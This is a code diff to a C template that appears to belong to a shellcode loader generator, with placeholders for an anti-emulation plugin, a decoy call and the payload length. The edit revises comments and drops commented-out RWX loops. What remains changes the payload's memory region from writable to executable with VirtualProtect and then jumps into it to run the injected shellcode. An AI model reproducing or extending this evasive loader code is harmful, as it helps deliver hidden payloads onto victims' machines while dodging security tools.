@@ -8,11 +8,12 @@ char *supermega_payload;
 #define p_RX  0x20
 #define p_RWX 0x40
 
-/* iat_reuse_rwx_rx
+/* change payload memory regions permissions
+   will reuse IMAGE locations
 
-   IAT reuse shellcode
-   * reuse payload location (both in .rdata and .text)
-   * does (rw/rx) -> rwx -> rx
+   depending on payload injection:
+   * .text -> rw -> rx
+   * .rdata -> rw -> rx
 */
 
 {{plugin_antiemulation}}
@@ -38,13 +39,6 @@ int main()
 	// Call: Decoy plugin
 	decoy();
 
-    // Note: RWX if carrier and payload are on the same page (or we cant exec copy..)
-    //       can do only RW otherwise?
-    /*for(int n=0; n<({{PAYLOAD_LEN}}/4096)+1; n++) {
-        if (VirtualProtect(dest + (n * 4096), 16, p_RWX, &result) == 0) {
-            return 16;
-        }
-    }*/
     if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RW, &result) == 0) {
         return 16;
     }
@@ -54,12 +48,6 @@ int main()
     if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
         return 16;
     }
-
-    /*for(int n=0; n<{{PAYLOAD_LEN}}/4096; n++) {
-        if (VirtualProtect(dest + (n * 4096), 16, p_RX, &result) == 0) {
-            return 16;
-        }
-    }*/
 
     // Execute *dest
     (*(void(*)())(dest))();
